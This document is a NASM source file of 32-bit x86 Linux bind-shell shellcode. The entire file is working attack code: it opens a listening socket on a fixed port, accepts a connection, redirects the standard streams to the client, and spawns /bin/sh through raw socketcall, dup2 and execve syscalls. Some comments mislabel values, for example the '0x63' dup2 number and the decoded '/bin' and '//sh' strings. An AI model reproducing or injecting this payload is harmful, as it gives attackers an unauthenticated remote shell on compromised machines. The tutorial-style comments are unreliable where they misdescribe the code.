BITS 32
section .text
global _start
_start:
    xor eax, eax            ; clear eax
    xor ebx, ebx            ; clear ebx
    xor edx, edx            ; clear edx
    
    ; server = socket (2, 1, 0)
    push eax                ; third arg to socket: 0
    push byte 0x1           ; second arg to socket: 1
    push byte 0x2           ; first arg to socket: 2
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    inc bl                  ; set first arg to socketcall to # 1
    mov al, 102             ; call socketcall # 1: SYS_SOCKET
    int 0x80                ; jump into kernel mode, execute the syscall
    mov esi, eax            ; store the return value (eax) into esi (server)
    
    ; bind(server, (struct sockadd *) &serv_addr, 0x10)
    push edx                ; still zero, terminate the next value pushed
    ;push 0xBBBB02BB         ; build struct:port, sin.family:02, & and 2 bytes:BB
    push word 0xBBBC
    push word 0x02
    mov ecx, esp            ; mov addr struct (on stack) to ecx
    push byte 0x10          ; begin the bind args, push 16 (size) on stack
    push ecx                ; save address of struct back on stack
    push esi                ; save server file descriptor (now in esi) to stack
    mov ecx, esp            ; set addr of array as 2 arg to socketcall
    inc ebx                 ; set bl to #2, first arg of socket call
    xor eax, eax            ; clear out eax
    mov al, 102             ; call socketcall # 2: SYS_BIND
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; listen(server, 0)
    push edx                ; still zero, used to terminate the next value pushed
    push esi                ; file descriptor for server (esi) pushed to stack
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    mov bl, 0x4             ; move 4 into bl, first arg of socketcall
    mov al, 102             ; call socketcall #4: SYS_LISTEN
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; client = accept(server, 0, 0)
    xor edx, edx            ; clear out edx
    push edx                ; still zero, third argument to accept pushed to stack
    push edx                ; still zero, second argument to accept pushed to stack
    push esi                ; saved file descriptor for server pushed to stack
    mov ecx, esp            ; args placed into ecx, serves as 2nd arg to socketcall
    inc ebx                 ; increment ebx to 5; first arg of socketcall
    xor eax, eax            ; clear out eax
    mov al, 102             ; call socketcall #5: SYS_ACCEPT
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; prepare for dup2 commands, need client file handle saved in ebx
    mov ebx, eax            ; copied return file descriptor of client to ebx
    
    ; dup2(client, 0)
    xor ecx, ecx            ; clear ecx and set to zero, stdin
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into
    
    ; dup2(client, 1)
    inc ecx                 ; increment ecx to 1, stdout
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into
    
    ; dup2(client, 2)
    inc ecx                 ; increment ecx to 2, stderr
    mov al, 63              ; set first arg of syscall to 0x63: dup2
    int 0x80                ; jump into

    ; spawn shellcode with execve
    xor eax, eax		; clears the eax register, sets to 0
    push eax			; push a null value on the stack, value of eax
    push 0x68732f6e		; push '//sh' onto the stack, padded with leading '/'.  The leading '/' is required for 4 byte alignment and has no effect.
    push 0x69622f2f		; push /bin onto the stack, notice strings in reverse
    mov ebx, esp		; since esp now points to "/bin/sh", write to ebx
    push eax			; eax is still NULL, let's terminate char ** argv on stack
    push ebx			; still need a pointer to the address of '/bin/sh', use ebx
    mov ecx, esp		; now esp holds the address of argv, move it to ecx
    xor edx, edx		; set edx to zero (NULL), not needed
    mov al, 0xb			; set the syscall # to the decimal 11 or hex b, one byte
    int 0x80			; call the kernel to execute the syscall
    
    
    
    
